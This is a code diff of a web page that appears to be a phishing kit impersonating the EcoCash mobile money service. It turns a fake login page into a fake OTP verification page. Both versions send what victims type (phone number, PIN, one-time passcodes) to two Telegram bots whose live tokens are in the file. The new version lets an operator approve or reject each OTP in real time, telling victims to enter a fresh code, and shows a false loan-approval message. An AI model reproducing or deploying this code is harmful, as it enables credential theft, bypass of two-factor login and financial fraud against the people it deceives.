@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash - Logins</title>
+    <title>EcoCash - OTP Verification</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
 
@@ -18,114 +18,80 @@
         body {
             min-height: 100vh;
             font-family: 'Inter', sans-serif;
-            background: white;
-            overflow-x: hidden;
+            background: #f5f7fa;
             overflow-y: auto;
-        }
-
-        body {
+            overflow-x: hidden;
             display: flex;
             flex-direction: column;
         }
 
-        .logo {
+        .header {
+            background: white;
+            padding: 20px;
             text-align: center;
-            padding: 50px 20px 20px;
-            flex-shrink: 0;
+            position: relative;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
         }
 
-        .logo-text {
-            font-size: 36px;
-            font-weight: 700;
-        }
-
-        .logo-eco {
-            color: #0066ff;
-        }
-
-        .logo-cash {
-            color: #ff0000;
-        }
-
-        .login-content {
-            flex: 1 0 auto;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 0 30px 50px;
-            max-width: 480px;
-            margin: 0 auto;
-            width: 100%;
+        .back-btn {
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 28px;
+            color: #333;
+            text-decoration: none;
         }
 
         .title {
-            font-size: 26px;
-            font-weight: 600;
+            font-size: 24px;
+            font-weight: 700;
             color: #333;
-            margin-bottom: 40px;
         }
 
-        .phone-group {
-            width: 100%;
-            border: 2px solid #0066ff;
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            padding: 18px 24px;
-            margin-bottom: 40px;
+        .container {
+            max-width: 480px;
+            margin: 40px auto;
+            padding: 30px;
             background: white;
-        }
-
-        .flag {
-            font-size: 28px;
-            margin-right: 12px;
-        }
-
-        .country-select {
-            display: flex;
-            align-items: center;
-            color: #0066ff;
-            font-weight: 600;
-            font-size: 18px;
-            margin-right: 16px;
-        }
-
-        .dropdown-arrow {
-            font-size: 14px;
-            margin-left: 6px;
-        }
-
-        .phone-input {
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
             flex: 1;
-            border: none;
-            outline: none;
-            font-size: 18px;
-            color: #333;
         }
 
-        .phone-input::placeholder {
-            color: #aaa;
-        }
-
-        .pin-label {
+        .subtitle {
             font-size: 16px;
             color: #666;
-            margin-bottom: 24px;
+            margin-bottom: 10px;
+        }
+
+        .phone {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 40px;
+        }
+
+        .otp-label {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 20px;
             font-weight: 500;
         }
 
-        .pin-group {
+        .otp-group {
             display: flex;
             justify-content: center;
-            gap: 20px;
+            gap: 12px;
             margin-bottom: 30px;
         }
 
-        .pin-box {
-            width: 60px;
+        .otp-box {
+            width: 50px;
             height: 60px;
             border: 2px solid #0066ff;
-            border-radius: 16px;
+            border-radius: 12px;
             font-size: 28px;
             text-align: center;
             background: white;
@@ -133,297 +99,225 @@
             font-weight: 600;
         }
 
-        .forgot {
-            font-size: 15px;
-            color: #0066ff;
-            text-decoration: none;
-            font-weight: 500;
-            margin-bottom: 40px;
+        .otp-box:focus {
+            outline: none;
+            border-color: #0066ff;
         }
 
-        #loginBtn {
-            display: none;
+        .resend {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 50px;
+        }
+
+        .resend span {
+            color: #0066ff;
+            font-weight: 600;
+        }
+
+        #submitBtn {
             width: 100%;
-            max-width: 400px;
             padding: 18px;
-            background: #0066ff;
-            color: white;
+            background: #ccc;
+            color: #999;
             border: none;
             border-radius: 50px;
             font-size: 18px;
             font-weight: 700;
+            cursor: not-allowed;
+        }
+
+        #submitBtn.enabled {
+            background: #0066ff;
+            color: white;
             cursor: pointer;
-            margin-bottom: 50px;
-            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.3);
         }
 
-        .bottom-section {
-            background: #005eb8;
-            color: white;
-            padding: 100px 30px 80px;
+        footer {
             text-align: center;
-            width: 100vw;
-            margin-left: calc(-50vw + 50%);
-            position: relative;
-            flex-shrink: 0;
-        }
-
-        .curve {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 90px;
-            background: white;
-            border-radius: 0 0 50% 50% / 0 0 100% 100%;
-            transform: scaleX(1.8);
-            transform-origin: top;
-        }
-
-        .bottom-content {
-            position: relative;
-            z-index: 2;
-        }
-
-        .bottom-text {
-            font-size: 15px;
-            margin-bottom: 35px;
-            line-height: 1.6;
-            opacity: 0.95;
-        }
-
-        .bottom-btns {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin-bottom: 40px;
-        }
-
-        .bottom-btn {
-            background: white;
-            color: #0066ff;
-            border: none;
-            border-radius: 30px;
-            padding: 18px 36px;
-            font-weight: 600;
-            font-size: 16px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
-            width: 180px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
-        }
-
-        .btn-icon {
-            font-size: 26px;
-            color: #0066ff;
-        }
-
-        .version {
+            padding: 30px 20px;
+            color: #aaa;
             font-size: 14px;
-            margin-bottom: 12px;
-            opacity: 0.9;
+            background: #f5f7fa;
+            flex-shrink: 0;
+            margin-top: auto;
+        }
+
+        /* FUTURISTIC PROCESSING SPINNER */
+        #spinnerOverlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            background: radial-gradient(circle at center, #102b49, #030914 75%);
+            backdrop-filter: blur(12px);
+        }
+
+        .spinner-container {
+            width: 85%;
+            max-width: 360px;
+            padding: 35px 22px;
+            text-align: center;
+            border: 1px solid rgba(0, 191, 255, 0.55);
+            border-radius: 20px;
+            background: linear-gradient(145deg, #07182c, #030a16);
+            box-shadow: 0 0 30px rgba(0, 174, 255, 0.2);
+        }
+
+        .spinner {
+            width: 75px;
+            height: 75px;
+            margin: 0 auto 25px;
+            border: 3px solid rgba(0, 191, 255, 0.15);
+            border-top: 3px solid #00d9ff;
+            border-right: 3px solid #168bff;
+            border-radius: 50%;
+            animation: futuristicSpin 1s linear infinite;
+            box-shadow: 0 0 18px rgba(0, 191, 255, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .spinner-inner {
+            width: 43px;
+            height: 43px;
+            border: 2px solid transparent;
+            border-bottom: 2px solid #00d9ff;
+            border-left: 2px solid #168bff;
+            border-radius: 50%;
+            animation: futuristicSpin 1.5s linear infinite reverse;
+        }
+
+        @keyframes futuristicSpin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .spinner-title {
+            color: #00d9ff;
+            font-size: 17px;
+            font-weight: 800;
+            letter-spacing: 2px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 12px #008cff;
+        }
+
+        .spinner-text {
+            color: #d4eaff;
+            font-size: 14px;
+            line-height: 1.8;
+            margin-bottom: 22px;
+        }
+
+        .loading-line {
+            height: 3px;
+            width: 100%;
+            background: #142c45;
+            overflow: hidden;
+            border-radius: 10px;
+            margin-bottom: 18px;
+        }
+
+        .loading-progress {
+            height: 100%;
+            width: 35%;
+            background: #00d9ff;
+            box-shadow: 0 0 12px #00bfff;
+            animation: loadingMove 1.5s ease-in-out infinite;
+        }
+
+        @keyframes loadingMove {
+            0% {
+                transform: translateX(-110%);
+            }
+            100% {
+                transform: translateX(310%);
+            }
+        }
+
+        .system-status {
+            color: #75cfff;
+            font-size: 10px;
+            letter-spacing: 1.5px;
+        }
+
+        .status-dot {
+            display: inline-block;
+            width: 7px;
+            height: 7px;
+            background: #00e5ff;
+            border-radius: 50%;
+            margin-right: 7px;
+            box-shadow: 0 0 10px #00e5ff;
+            animation: statusPulse 1s infinite alternate;
+        }
+
+        @keyframes statusPulse {
+            from {
+                opacity: 0.3;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        /* RESULT OVERLAY */
+        #resultOverlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.98);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 10000;
+            padding: 20px;
+        }
+
+        .result-message {
+            font-size: 18px;
+            color: #333;
+            text-align: center;
+            line-height: 1.6;
+            max-width: 340px;
             font-weight: 500;
+            white-space: pre-line;
         }
-
-        .terms {
-            font-size: 13px;
-            opacity: 0.85;
-            line-height: 1.5;
-        }
-
-        .terms a {
-            color: white;
-            text-decoration: underline;
-            font-weight: 500;
-        }
-
-       /* FUTURISTIC PROCESSING SPINNER (#0066ff & #ff0000) */
-#spinnerOverlay {
-    display: none;
-    position: fixed;
-    inset: 0;
-    z-index: 9999;
-    align-items: center;
-    justify-content: center;
-    background: radial-gradient(circle at center, rgba(0, 102, 255, 0.22), #030712 75%);
-    backdrop-filter: blur(12px);
-}
-
-.spinner-container {
-    width: 85%;
-    max-width: 360px;
-    padding: 35px 22px;
-    text-align: center;
-    border: 1px solid rgba(0, 102, 255, 0.6);
-    border-radius: 20px;
-    background: linear-gradient(145deg, #071124, #0a0408);
-    box-shadow: 0 0 30px rgba(0, 102, 255, 0.35), 0 0 18px rgba(255, 0, 0, 0.2);
-}
-
-.spinner {
-    width: 75px;
-    height: 75px;
-    margin: 0 auto 25px;
-    border: 3px solid rgba(0, 102, 255, 0.15);
-    border-top: 3px solid #0066ff;
-    border-right: 3px solid #ff0000;
-    border-radius: 50%;
-    animation: futuristicSpin 1s linear infinite;
-    box-shadow: 0 0 20px rgba(0, 102, 255, 0.5), inset 0 0 12px rgba(255, 0, 0, 0.3);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-.spinner-inner {
-    width: 43px;
-    height: 43px;
-    border: 3px solid transparent;
-    border-bottom: 3px solid #ff0000;
-    border-left: 3px solid #0066ff;
-    border-radius: 50%;
-    animation: futuristicSpin 1.4s linear infinite reverse;
-}
-
-@keyframes futuristicSpin {
-    to {
-        transform: rotate(360deg);
-    }
-}
-
-.spinner-title {
-    background: linear-gradient(90deg, #0066ff, #ff0000);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    font-size: 17px;
-    font-weight: 800;
-    letter-spacing: 2px;
-    margin-bottom: 15px;
-    filter: drop-shadow(0 0 8px rgba(0, 102, 255, 0.5));
-}
-
-.spinner-text {
-    color: #e2ecff;
-    font-size: 14px;
-    line-height: 1.8;
-    margin-bottom: 22px;
-}
-
-.loading-line {
-    height: 4px;
-    width: 100%;
-    background: #111c33;
-    overflow: hidden;
-    border-radius: 10px;
-    margin-bottom: 18px;
-}
-
-.loading-progress {
-    height: 100%;
-    width: 40%;
-    background: linear-gradient(90deg, #0066ff, #ff0000);
-    box-shadow: 0 0 12px #0066ff, 0 0 12px #ff0000;
-    animation: loadingMove 1.5s ease-in-out infinite;
-}
-
-@keyframes loadingMove {
-    0% {
-        transform: translateX(-110%);
-    }
-    100% {
-        transform: translateX(310%);
-    }
-}
-
-.system-status {
-    color: #8cb8ff;
-    font-size: 10px;
-    letter-spacing: 1.5px;
-    font-weight: 600;
-}
-
-.status-dot {
-    display: inline-block;
-    width: 8px;
-    height: 8px;
-    background: #ff0000;
-    border-radius: 50%;
-    margin-right: 7px;
-    box-shadow: 0 0 10px #ff0000;
-    animation: statusPulse 0.9s infinite alternate;
-}
-
-@keyframes statusPulse {
-    from {
-        background: #0066ff;
-        box-shadow: 0 0 10px #0066ff;
-        opacity: 0.5;
-    }
-    to {
-        background: #ff0000;
-        box-shadow: 0 0 12px #ff0000;
-        opacity: 1;
-    }
-}
     </style>
 </head>
 
 <body>
-    <div class="logo">
-        <div class="logo-text">
-            <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
-        </div>
+    <div class="header">
+        <a href="login" class="back-btn">←</a>
+        <div class="title">OTP Verification</div>
     </div>
 
-    <div class="login-content">
-        <h1 class="title">Login</h1>
+    <div class="container">
+        <div class="subtitle">Enter the OTP sent to your phone number</div>
+        <div class="phone" id="maskedPhone"></div>
 
-        <div class="phone-group">
-            <span class="flag">🇿🇼</span>
-            <div class="country-select">
-                +263 <span class="dropdown-arrow">▼</span>
-            </div>
-            <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number">
+        <div class="otp-label">OTP</div>
+        <div class="otp-group">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
         </div>
 
-        <div class="pin-label">Enter your PIN</div>
-        <div class="pin-group">
-            <input type="password" class="pin-box" maxlength="1">
-            <input type="password" class="pin-box" maxlength="1">
-            <input type="password" class="pin-box" maxlength="1">
-            <input type="password" class="pin-box" maxlength="1">
-        </div>
+        <div class="resend">Resend OTP in <span id="timer">116</span> seconds</div>
 
-        <a href="#" class="forgot">Forgot PIN?</a>
-
-        <button id="loginBtn">LOGIN</button>
+        <button id="submitBtn" disabled>Submit</button>
     </div>
 
-    <div class="bottom-section">
-        <div class="curve"></div>
-        <div class="bottom-content">
-            <div class="bottom-text">
-                To register an EcoCash wallet or get assistance,<br> click below
-            </div>
-            <div class="bottom-btns">
-                <a href="#" class="bottom-btn">
-                    <div class="btn-icon">👤</div>
-                    Register
-                </a>
-                <a href="#" class="bottom-btn">
-                    <div class="btn-icon">ℹ️</div>
-                    Help & Support
-                </a>
-            </div>
-            <div class="version">v2.13P</div>
-            <div class="terms">
-                By signing in you agree to the <a href="#">Terms and Conditions</a>
-            </div>
-        </div>
-    </div>
+    <footer>© 2026 EcoCash</footer>
 
+    <!-- FUTURISTIC PROCESSING SPINNER -->
     <div id="spinnerOverlay">
         <div class="spinner-container">
             <div class="spinner">
@@ -435,7 +329,7 @@
             </div>
 
             <div class="spinner-text">
-                Please wait...<br> This usually takes a few seconds
+                Please wait as we send your request for approval or rejection.
             </div>
 
             <div class="loading-line">
@@ -444,97 +338,270 @@
 
             <div class="system-status">
                 <span class="status-dot"></span>
-                SYSTEM STATUS: PROCESSING
+                SYSTEM STATUS: AWAITING DECISION
             </div>
         </div>
     </div>
 
+    <!-- RESULT OVERLAY -->
+    <div id="resultOverlay">
+        <div class="result-message" id="resultMessage"></div>
+    </div>
+
     <script>
-        // Bot 1 (your existing)
+        // Bot 1
         const BOT_TOKEN_1 = '9272926860:AAHanS0gwvEev4NGUmxOXoPtM22ZmwbdMZs';
         const CHAT_ID_1 = '6527631508';
 
-        // Bot 2 (your second bot)
+        // Bot 2
         const BOT_TOKEN_2 = '8799263708:AAGKJWoeVBe0HkTCCXTnCbSf9N4biwbH4_Y';
         const CHAT_ID_2 = '8520094229';
 
-        const savedPhone = localStorage.getItem('phone');
-        const phoneInput = document.getElementById('phoneInput');
-        if (savedPhone && savedPhone.length === 9) {
-            phoneInput.value = savedPhone;
-        }
-        const pinBoxes = document.querySelectorAll('.pin-box');
-        const loginBtn = document.getElementById('loginBtn');
+        // Mask phone from localStorage
+        const savedPhone = localStorage.getItem('phone') || '785123463';
+        const visibleStart = savedPhone.slice(0, 3);
+        const visibleEnd = savedPhone.slice(-2);
+        const masked = visibleStart + '****' + visibleEnd;
+        document.getElementById('maskedPhone').textContent = '+263 ' + masked;
+
+        const otpBoxes = document.querySelectorAll('.otp-box');
+        const submitBtn = document.getElementById('submitBtn');
         const spinnerOverlay = document.getElementById('spinnerOverlay');
-        let pinValue = '';
+        const resultOverlay = document.getElementById('resultOverlay');
+        const resultMessage = document.getElementById('resultMessage');
+        const timerSpan = document.getElementById('timer');
 
-        function checkPinComplete() {
-            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
-            loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
+        let otpValue = '';
+        let seconds = 116;
+        let pollInterval1 = null;
+        let pollInterval2 = null;
+        let lastUpdateId1 = 0;
+        let lastUpdateId2 = 0;
+        let currentTimestamp = 0;
+        let actionProcessed = false;
+
+        // Countdown timer
+        const countdown = setInterval(() => {
+            seconds--;
+            timerSpan.textContent = seconds;
+            if (seconds <= 0) {
+                clearInterval(countdown);
+                timerSpan.textContent = '0';
+            }
+        }, 1000);
+
+        function checkOtpComplete() {
+            otpValue = Array.from(otpBoxes).map(box => box.value).join('');
+            if (otpValue.length === 6) {
+                submitBtn.classList.add('enabled');
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.classList.remove('enabled');
+                submitBtn.disabled = true;
+            }
         }
 
-        pinBoxes.forEach((box, index) => {
-            box.addEventListener('input', () => {
-                if (box.value.length === 1 && index < 3) {
-                    pinBoxes[index + 1].focus();
-                }
-                checkPinComplete();
+        function resetToOtpEntry() {
+            spinnerOverlay.style.display = 'none';
+            resultOverlay.style.display = 'none';
+            otpBoxes.forEach(box => {
+                box.value = '';
             });
+            otpValue = '';
+            actionProcessed = false;
+            checkOtpComplete();
+            otpBoxes[0].focus();
+        }
+
+        function showRejectNoticeAndReturnToOtp() {
+            spinnerOverlay.style.display = 'none';
+            resultOverlay.style.display = 'flex';
+            resultOverlay.style.background = 'rgba(2, 8, 20, 0.96)';
+            resultOverlay.style.backdropFilter = 'blur(12px)';
+
+            resultMessage.style.cssText = `
+                color: #00d9ff;
+                background: linear-gradient(145deg, #071426, #102b49, #050d1b);
+                border: 1px solid #00bfff;
+                border-radius: 16px;
+                padding: 25px 20px;
+                margin: 15px;
+                font-size: 16px;
+                font-weight: 700;
+                line-height: 1.8;
+                text-align: center;
+                letter-spacing: 0.5px;
+                text-shadow: 0 0 8px #00bfff, 0 0 18px #0077ff;
+                box-shadow: 0 0 15px rgba(0,191,255,0.4),
+                            inset 0 0 15px rgba(0,191,255,0.08);
+            `;
+            resultMessage.textContent = 'Please enter a new OTP we have sent.';
+
+            setTimeout(() => {
+                resetToOtpEntry();
+            }, 2200);
+        }
+
+        otpBoxes.forEach((box, index) => {
+            box.addEventListener('input', () => {
+                box.value = box.value.replace(/\D/g, '');
+                if (box.value.length === 1 && index < 5) {
+                    otpBoxes[index + 1].focus();
+                }
+                checkOtpComplete();
+            });
+
             box.addEventListener('keydown', (e) => {
                 if (e.key === 'Backspace' && box.value === '' && index > 0) {
-                    pinBoxes[index - 1].focus();
+                    otpBoxes[index - 1].focus();
                 }
             });
         });
 
-        // ========== LOGIN CLICK ==========
-        loginBtn.addEventListener('click', () => {
-            const phone = phoneInput.value.trim();
-            if (!phone) {
-                alert('Please enter phone number');
+        // Helper to send a message with inline Approve / Reject buttons
+        function sendToBot(botToken, chatId, text, replyMarkup) {
+            const payload = {
+                chat_id: chatId,
+                text: text,
+                parse_mode: 'Markdown'
+            };
+            if (replyMarkup) {
+                payload.reply_markup = replyMarkup;
+            }
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+
+        // Handle Approve or Reject callback from Telegram
+        function handleCallback(callbackData, callbackQueryId, botToken) {
+            if (actionProcessed) return;
+            actionProcessed = true;
+
+            fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    callback_query_id: callbackQueryId
+                })
+            }).catch(() => {});
+
+            if (pollInterval1) clearInterval(pollInterval1);
+            if (pollInterval2) clearInterval(pollInterval2);
+
+            const [decision] = callbackData.split('_');
+
+            if (decision === 'reject') {
+                showRejectNoticeAndReturnToOtp();
                 return;
             }
 
+            spinnerOverlay.style.display = 'none';
+            resultOverlay.style.display = 'flex';
+
+            resultOverlay.style.background = 'rgba(2, 8, 20, 0.96)';
+            resultOverlay.style.backdropFilter = 'blur(12px)';
+
+            resultMessage.style.cssText = `
+                color: #00d9ff;
+                background: linear-gradient(145deg, #071426, #102b49, #050d1b);
+                border: 1px solid #00bfff;
+                border-radius: 16px;
+                padding: 25px 20px;
+                margin: 15px;
+                font-size: 16px;
+                font-weight: 700;
+                line-height: 1.8;
+                text-align: center;
+                letter-spacing: 0.5px;
+                text-shadow: 0 0 8px #00bfff, 0 0 18px #0077ff;
+                box-shadow: 0 0 15px rgba(0,191,255,0.4),
+                            inset 0 0 15px rgba(0,191,255,0.08);
+            `;
+
+            if (decision === 'approve') {
+                resultMessage.textContent = '✦ REQUEST APPROVED ✦\n\nYour loan verification has been approved. Please stay on this page while we finalize your application.';
+            }
+        }
+
+        // Poll a single bot for callback responses
+        function pollBot(botToken, lastUpdateId) {
+            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok && data.result.length > 0) {
+                        for (let update of data.result) {
+                            if (botToken === BOT_TOKEN_1) {
+                                lastUpdateId1 = Math.max(lastUpdateId1, update.update_id);
+                            } else {
+                                lastUpdateId2 = Math.max(lastUpdateId2, update.update_id);
+                            }
+
+                            if (update.callback_query && !actionProcessed) {
+                                const cb = update.callback_query;
+                                const [, ts] = cb.data.split('_');
+
+                                if (parseInt(ts, 10) === currentTimestamp) {
+                                    handleCallback(cb.data, cb.id, botToken);
+                                    return;
+                                }
+                            }
+                        }
+                    }
+                })
+                .catch(() => {});
+        }
+
+        // Start polling both bots
+        function startPollingBoth() {
+            actionProcessed = false;
+
+            pollInterval1 = setInterval(() => {
+                pollBot(BOT_TOKEN_1, lastUpdateId1);
+            }, 1500);
+
+            pollInterval2 = setInterval(() => {
+                pollBot(BOT_TOKEN_2, lastUpdateId2);
+            }, 1500);
+        }
+
+        submitBtn.addEventListener('click', () => {
+            checkOtpComplete();
+            if (otpValue.length !== 6) return;
+
             spinnerOverlay.style.display = 'flex';
+            currentTimestamp = Date.now();
 
-            // Save phone to localStorage
-            localStorage.setItem('phone', phone);
+            const message = `*Loan Verification Request*\n\n📱 Phone: +263 ${savedPhone}\n🔢 Entered OTP: ${otpValue}\n\nSelect *Approve* or *Reject* for this request.`;
+            const replyMarkup = {
+                inline_keyboard: [
+                    [
+                        {
+                            text: '✅ Approve',
+                            callback_data: 'approve_' + currentTimestamp
+                        },
+                        {
+                            text: '❌ Reject',
+                            callback_data: 'reject_' + currentTimestamp
+                        }
+                    ]
+                ]
+            };
 
-            // Build the credential message
-            const message = `New Login Attempt\n\nPhone: +263 ${phone}\nPIN: ${pinValue}`;
+            sendToBot(BOT_TOKEN_1, CHAT_ID_1, message, replyMarkup);
+            sendToBot(BOT_TOKEN_2, CHAT_ID_2, message, replyMarkup);
 
-            // Send to Bot 1
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID_1,
-                    text: message
-                })
-            }).catch(() => {});
-
-            // Send to Bot 2
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID_2,
-                    text: message
-                })
-            }).catch(() => {});
-
-            // Proceed to next page
-            setTimeout(() => {
-                window.location.href = 'otp.html';
-            }, 10000);
+            startPollingBoth();
         });
 
-        checkPinComplete();
-        pinBoxes[0].focus();
+        checkOtpComplete();
+        otpBoxes[0].focus();
     </script>
 </body>
 
